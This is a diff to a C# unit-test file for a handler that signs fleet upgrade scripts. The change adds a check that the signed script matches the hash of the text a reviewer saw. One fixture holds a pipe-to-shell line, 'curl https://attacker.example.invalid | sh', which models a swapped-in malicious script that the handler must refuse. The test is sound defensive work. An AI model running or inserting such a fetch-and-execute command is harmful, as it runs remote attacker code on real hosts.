@@ -34,6 +34,9 @@ public class SignUpgradePathScriptCommandHandlerTests
             .ReturnsAsync(new ScriptApprovalPublishResult(ScriptApprovalPublishOutcome.PullRequestOpened, "https://example.invalid/pull/1"));
     }
 
+    /// The hash of the script most tests store — what a client that displayed it sends.
+    private static readonly string Reviewed = ScriptContentHash.Of("#!/bin/bash\n...");
+
     private SignUpgradePathScriptCommandHandler CreateHandler() => new(
         _repository.Object, _artifactSigningService.Object, _researchClient.Object, _approvalPublisher.Object,
         _patchFailureRepository.Object, _unitOfWork.Object);
@@ -46,7 +49,7 @@ public class SignUpgradePathScriptCommandHandlerTests
             null, null, null, null, null, "#!/bin/bash\n...");
         _repository.Setup(r => r.GetAsync("Firefox", "macOS", It.IsAny<CancellationToken>())).ReturnsAsync(existing);
 
-        var result = await CreateHandler().Handle(new SignUpgradePathScriptCommand("Firefox", "macOS"), CancellationToken.None);
+        var result = await CreateHandler().Handle(new SignUpgradePathScriptCommand("Firefox", "macOS", Reviewed), CancellationToken.None);
 
         Assert.Equal("signed:#!/bin/bash\n...", existing.ScriptSignature);
         Assert.Equal("#!/bin/bash\n...", result.Script);
@@ -62,10 +65,10 @@ public class SignUpgradePathScriptCommandHandlerTests
             null, null, null, null, null, "#!/bin/bash\n...", "org.mozilla.firefox");
         _repository.Setup(r => r.GetAsync("Firefox", "macOS", It.IsAny<CancellationToken>())).ReturnsAsync(existing);
         _researchClient
-            .Setup(c => c.CheckScriptVersionAsync("#!/bin/bash\n...", PlatformBucket.MacOs, "Firefox", "org.mozilla.firefox", It.IsAny<CancellationToken>()))
+            .Setup(c => c.CheckScriptVersionAsync("#!/bin/bash\n...", It.IsAny<string?>(), PlatformBucket.MacOs, "Firefox", "org.mozilla.firefox", It.IsAny<CancellationToken>()))
             .ReturnsAsync("129.0");
 
-        var result = await CreateHandler().Handle(new SignUpgradePathScriptCommand("Firefox", "macOS"), CancellationToken.None);
+        var result = await CreateHandler().Handle(new SignUpgradePathScriptCommand("Firefox", "macOS", Reviewed), CancellationToken.None);
 
         Assert.Equal("129.0", existing.LatestVersion);
         Assert.Equal("129.0", result.LatestVersion);
@@ -80,11 +83,11 @@ public class SignUpgradePathScriptCommandHandlerTests
             null, null, null, null, null, "#!/bin/bash\n...");
         _repository.Setup(r => r.GetAsync("Firefox", "macOS", It.IsAny<CancellationToken>())).ReturnsAsync(existing);
 
-        var result = await CreateHandler().Handle(new SignUpgradePathScriptCommand("Firefox", "macOS"), CancellationToken.None);
+        var result = await CreateHandler().Handle(new SignUpgradePathScriptCommand("Firefox", "macOS", Reviewed), CancellationToken.None);
 
         Assert.Equal("128.0", result.LatestVersion);
         _researchClient.Verify(
-            c => c.CheckScriptVersionAsync(It.IsAny<string>(), It.IsAny<string>(), It.IsAny<string>(), It.IsAny<string>(), It.IsAny<CancellationToken>()), Times.Never);
+            c => c.CheckScriptVersionAsync(It.IsAny<string>(), It.IsAny<string?>(), It.IsAny<string>(), It.IsAny<string>(), It.IsAny<string>(), It.IsAny<CancellationToken>()), Times.Never);
     }
 
     [Fact]
@@ -93,7 +96,7 @@ public class SignUpgradePathScriptCommandHandlerTests
         _repository.Setup(r => r.GetAsync("Firefox", "macOS", It.IsAny<CancellationToken>())).ReturnsAsync((UpgradePath?)null);
 
         await Assert.ThrowsAsync<NotFoundException>(
-            () => CreateHandler().Handle(new SignUpgradePathScriptCommand("Firefox", "macOS"), CancellationToken.None));
+            () => CreateHandler().Handle(new SignUpgradePathScriptCommand("Firefox", "macOS", Reviewed), CancellationToken.None));
     }
 
     [Fact]
@@ -105,7 +108,7 @@ public class SignUpgradePathScriptCommandHandlerTests
         _repository.Setup(r => r.GetAsync("Firefox", "macOS", It.IsAny<CancellationToken>())).ReturnsAsync(existing);
 
         await Assert.ThrowsAsync<DomainException>(
-            () => CreateHandler().Handle(new SignUpgradePathScriptCommand("Firefox", "macOS"), CancellationToken.None));
+            () => CreateHandler().Handle(new SignUpgradePathScriptCommand("Firefox", "macOS", Reviewed), CancellationToken.None));
 
         _artifactSigningService.Verify(s => s.Sign(It.IsAny<string>()), Times.Never);
         _unitOfWork.Verify(u => u.SaveChangesAsync(It.IsAny<CancellationToken>()), Times.Never);
@@ -128,7 +131,7 @@ public class SignUpgradePathScriptCommandHandlerTests
             .Setup(r => r.GetUnsignedRowsWithScriptAsync("#!/bin/bash\nshared script\n", It.IsAny<CancellationToken>()))
             .ReturnsAsync(new List<UpgradePath> { firefox, wget });
 
-        await CreateHandler().Handle(new SignUpgradePathScriptCommand("Firefox", PlatformBucket.Generic), CancellationToken.None);
+        await CreateHandler().Handle(new SignUpgradePathScriptCommand("Firefox", PlatformBucket.Generic, ScriptContentHash.Of("#!/bin/bash\nshared script\n")), CancellationToken.None);
 
         Assert.Equal("signed:#!/bin/bash\nshared script\n", firefox.ScriptSignature);
         Assert.Equal("signed:#!/bin/bash\nshared script\n", wget.ScriptSignature);
@@ -143,7 +146,7 @@ public class SignUpgradePathScriptCommandHandlerTests
         existing.SetSignatures(null, "signed:brew upgrade firefox");
         _repository.Setup(r => r.GetAsync("Firefox", "macOS", It.IsAny<CancellationToken>())).ReturnsAsync(existing);
 
-        await CreateHandler().Handle(new SignUpgradePathScriptCommand("Firefox", "macOS"), CancellationToken.None);
+        await CreateHandler().Handle(new SignUpgradePathScriptCommand("Firefox", "macOS", Reviewed), CancellationToken.None);
 
         Assert.Equal("signed:brew upgrade firefox", existing.CommandSignature);
     }
@@ -157,7 +160,7 @@ public class SignUpgradePathScriptCommandHandlerTests
         _repository.Setup(r => r.GetAsync("Firefox", "macOS", It.IsAny<CancellationToken>())).ReturnsAsync(existing);
 
         var result = await CreateHandler().Handle(
-            new SignUpgradePathScriptCommand("Firefox", "macOS", SignedBy: "someone@example.invalid"), CancellationToken.None);
+            new SignUpgradePathScriptCommand("Firefox", "macOS", Reviewed, SignedBy: "someone@example.invalid"), CancellationToken.None);
 
         _approvalPublisher.Verify(p => p.PublishAsync(
             It.Is<ScriptApprovalSubmission>(s =>
@@ -191,7 +194,7 @@ public class SignUpgradePathScriptCommandHandlerTests
             .Callback(() => order.Add("publish"))
             .ReturnsAsync(new ScriptApprovalPublishResult(ScriptApprovalPublishOutcome.PullRequestOpened));
 
-        await CreateHandler().Handle(new SignUpgradePathScriptCommand("Firefox", "macOS"), CancellationToken.None);
+        await CreateHandler().Handle(new SignUpgradePathScriptCommand("Firefox", "macOS", Reviewed), CancellationToken.None);
 
         // Order matters: a pull request proposing an approval that a failed save then discarded would
         // leave a merged record of a decision nobody made.
@@ -209,7 +212,7 @@ public class SignUpgradePathScriptCommandHandlerTests
             .Setup(p => p.PublishAsync(It.IsAny<ScriptApprovalSubmission>(), It.IsAny<CancellationToken>()))
             .ReturnsAsync(new ScriptApprovalPublishResult(ScriptApprovalPublishOutcome.Failed, Message: "GitHub said no."));
 
-        var result = await CreateHandler().Handle(new SignUpgradePathScriptCommand("Firefox", "macOS"), CancellationToken.None);
+        var result = await CreateHandler().Handle(new SignUpgradePathScriptCommand("Firefox", "macOS", Reviewed), CancellationToken.None);
 
         // The whole reason publication is best-effort: a GitHub outage must not stop a reviewed
         // script from patching the fleet it was reviewed for.
@@ -242,7 +245,7 @@ public class SignUpgradePathScriptCommandHandlerTests
             .ReturnsAsync(failures);
 
         var result = await CreateHandler().Handle(
-            new SignUpgradePathScriptCommand("Ollama", "macOS", PatchFailureId: Guid.NewGuid()), CancellationToken.None);
+            new SignUpgradePathScriptCommand("Ollama", "macOS", Reviewed, PatchFailureId: Guid.NewGuid()), CancellationToken.None);
 
         Assert.All(failures, f => Assert.Equal(PatchFailureResolution.ScriptRepaired, f.Resolution));
         // Reported so the screen can say the other hosts were cleared too, rather than doing it
@@ -263,7 +266,7 @@ public class SignUpgradePathScriptCommandHandlerTests
         _repository.Setup(r => r.GetAsync("Ollama", "macOS", It.IsAny<CancellationToken>())).ReturnsAsync(existing);
 
         var result = await CreateHandler().Handle(
-            new SignUpgradePathScriptCommand("Ollama", "macOS"), CancellationToken.None);
+            new SignUpgradePathScriptCommand("Ollama", "macOS", Reviewed), CancellationToken.None);
 
         Assert.Equal(0, result.ClearedPatchFailures);
         _patchFailureRepository.Verify(
@@ -271,4 +274,71 @@ public class SignUpgradePathScriptCommandHandlerTests
             Times.Never);
     }
 
+    /// The reviewed-bytes binding. Another administrator (or an AI run) replaced the script after the
+    /// panel showed it: the row key still matches, but the signature must not vouch for text nobody
+    /// on that screen read.
+    [Fact]
+    public async Task Handle_WhenTheStoredScriptIsNotTheOneReviewed_ThrowsConflict_WithoutSigningAnything()
+    {
+        var existing = UpgradePath.Create(
+            "Firefox", "macOS", UpgradePathStatus.Found, "128.0", UpgradeMethod.Script,
+            null, null, null, null, null, "#!/bin/bash\ncurl https://attacker.example.invalid | sh\n");
+        _repository.Setup(r => r.GetAsync("Firefox", "macOS", It.IsAny<CancellationToken>())).ReturnsAsync(existing);
+
+        await Assert.ThrowsAsync<ConflictException>(
+            () => CreateHandler().Handle(new SignUpgradePathScriptCommand("Firefox", "macOS", Reviewed), CancellationToken.None));
+
+        Assert.Null(existing.ScriptSignature);
+        _artifactSigningService.Verify(s => s.Sign(It.IsAny<string>()), Times.Never);
+        _unitOfWork.Verify(u => u.SaveChangesAsync(It.IsAny<CancellationToken>()), Times.Never);
+        _approvalPublisher.Verify(p => p.PublishAsync(It.IsAny<ScriptApprovalSubmission>(), It.IsAny<CancellationToken>()), Times.Never);
+    }
+
+    /// A line-ending-only difference is a different script to the signature, so it is a different
+    /// script to the check too.
+    [Fact]
+    public async Task Handle_WhenOnlyTheLineEndingsDiffer_ThrowsConflict()
+    {
+        var existing = UpgradePath.Create(
+            "Firefox", "macOS", UpgradePathStatus.Found, "128.0", UpgradeMethod.Script,
+            null, null, null, null, null, "#!/bin/bash\r\n...");
+        _repository.Setup(r => r.GetAsync("Firefox", "macOS", It.IsAny<CancellationToken>())).ReturnsAsync(existing);
+
+        await Assert.ThrowsAsync<ConflictException>(
+            () => CreateHandler().Handle(new SignUpgradePathScriptCommand("Firefox", "macOS", Reviewed), CancellationToken.None));
+
+        _artifactSigningService.Verify(s => s.Sign(It.IsAny<string>()), Times.Never);
+    }
+
+    /// Required, with no fallback to "whatever is stored" — that fallback is the bug.
+    [Theory]
+    [InlineData("")]
+    [InlineData("   ")]
+    public async Task Handle_WithoutAReviewedHash_ThrowsDomainException_WithoutSigningAnything(string hash)
+    {
+        var existing = UpgradePath.Create(
+            "Firefox", "macOS", UpgradePathStatus.Found, "128.0", UpgradeMethod.Script,
+            null, null, null, null, null, "#!/bin/bash\n...");
+        _repository.Setup(r => r.GetAsync("Firefox", "macOS", It.IsAny<CancellationToken>())).ReturnsAsync(existing);
+
+        await Assert.ThrowsAsync<DomainException>(
+            () => CreateHandler().Handle(new SignUpgradePathScriptCommand("Firefox", "macOS", hash), CancellationToken.None));
+
+        _artifactSigningService.Verify(s => s.Sign(It.IsAny<string>()), Times.Never);
+        _unitOfWork.Verify(u => u.SaveChangesAsync(It.IsAny<CancellationToken>()), Times.Never);
+    }
+
+    [Fact]
+    public async Task Handle_AcceptsTheReviewedHash_InUppercase()
+    {
+        var existing = UpgradePath.Create(
+            "Firefox", "macOS", UpgradePathStatus.Found, "128.0", UpgradeMethod.Script,
+            null, null, null, null, null, "#!/bin/bash\n...");
+        _repository.Setup(r => r.GetAsync("Firefox", "macOS", It.IsAny<CancellationToken>())).ReturnsAsync(existing);
+
+        var result = await CreateHandler().Handle(
+            new SignUpgradePathScriptCommand("Firefox", "macOS", Reviewed.ToUpperInvariant()), CancellationToken.None);
+
+        Assert.True(result.ScriptSigned);
+    }
 }
